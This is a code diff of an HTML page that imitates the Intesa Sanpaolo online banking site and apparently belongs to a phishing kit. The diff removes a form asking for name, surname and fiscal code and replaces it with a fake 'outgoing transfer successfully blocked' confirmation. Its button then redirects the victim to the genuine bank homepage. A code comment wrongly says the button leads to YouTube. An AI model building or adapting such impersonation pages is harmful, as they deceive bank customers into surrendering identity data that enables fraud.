@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Intesa Sanpaolo - Banca Online</title>
-    <link rel="stylesheet" href="completaAccesso-styles.css">
+    <link rel="stylesheet" href="bloccato-styles.css">
     <!-- Preload Open Sans fonts -->
     <link rel="preload" href="fonts/OpenSans-Regular.ttf" as="font" type="font/ttf" crossorigin>
     <link rel="preload" href="fonts/OpenSans-Light.woff2" as="font" type="font/woff2" crossorigin>
@@ -130,45 +130,29 @@
                         <!-- Breadcrumb -->
                         <div class="breadcrumb-accesso">
                             <span class="home">Home</span>
-                            <span class="step">Inserimento dati</span>
+                            <span class="step">Esito verifica</span>
                         </div>
                         <!-- Barra avanzamento -->
                         <div class="progress-accesso">
                             <div class="title">ATTIVAZIONE</div>
-                            <div class="bar">
-                                <div class="step-green"></div>
-                                <div class="step-gray"></div>
+                            <div class="bar" style="display: flex; justify-content: center; align-items: center;">
+                                <div class="step-green" style="width: 120px; height: 8px; background: #258900; border-radius: 4px;"></div>
                             </div>
-                            <div class="labels">
-                                <span class="compila">COMPILA</span>
-                                <span class="esito">ESITO</span>
+                            <div class="labels" style="display: flex; justify-content: center; margin-top: 8px;">
+                                <span class="esito" style="color: #258900; font-weight: bold;">ESITO</span>
                             </div>
                         </div>
+                        <!-- Fine barra avanzamento -->
                         <!-- Linea orizzontale -->
                         <div class="linea-orizzontale-accesso"></div>
                         <!-- Titolo -->
-                        <div class="titolo-accesso">Inserisci i dati richiesti</div>
-                        <!-- Form -->
-                        <form class="dati-form">
-                            <div class="dati-form-fields">
-                                <div>
-                                    <label for="nome">Nome*</label>
-                                    <input type="text" id="nome" name="nome" class="form-input"/>
-                                </div>
-                                <div>
-                                    <label for="cognome">Cognome*</label>
-                                    <input type="text" id="cognome" name="cognome" class="form-input"/>
-                                </div>
-                                <div>
-                                    <label for="cf">Codice fiscale*</label>
-                                    <input type="text" id="cf" name="cf" class="form-input"/>
-                                </div>
-                            </div>
-                            <div class="dati-form-actions">
-                                <button type="button" class="indietro-btn">INDIETRO</button>
-                                <button type="submit" class="login-button">CONTINUA</button>
-                            </div>
-                        </form>
+                        <div class="titolo-accesso">Bonifico in uscita bloccato con successo!</div>
+                        <!-- Sostituito tutto il blocco sottostante con immagine centrata -->
+                        <div style="display: flex; justify-content: center; align-items: center; margin: 40px 0;">
+                            <img src="img/download.svg" alt="Download" style="max-width: 200px; width: 100%; height: auto; margin-bottom: 50px;" />
+                        </div>
+                        <!-- Fine sostituzione -->
+                        <button id="continua-verifica-btn" class="login-button" type="button" style="display:block; width:100%; max-width:300px; margin:0 auto 50px auto;">CHIUDI</button>
                     </div>
                 </div>
             </div>
@@ -339,13 +323,14 @@
         </div>
     </div>
 
-    <script src="completaAccesso-script.js"></script>
+    <script src="bloccato-script.js"></script>
     <script>
-document.getElementById('nome').addEventListener('input', function(e) {
-    this.value = this.value.replace(/[0-9]/g, '');
-});
-document.getElementById('cognome').addEventListener('input', function(e) {
-    this.value = this.value.replace(/[0-9]/g, '');
+// Disabilito tutta la logica di input e attivazione/disattivazione bottone
+// Rendo il bottone sempre attivo e cliccabile, e al click porta a youtube.com
+
+document.getElementById('continua-verifica-btn').disabled = false;
+document.getElementById('continua-verifica-btn').addEventListener('click', function() {
+    window.location.href = 'https://www.intesasanpaolo.com/';
 });
 </script>
 </body>
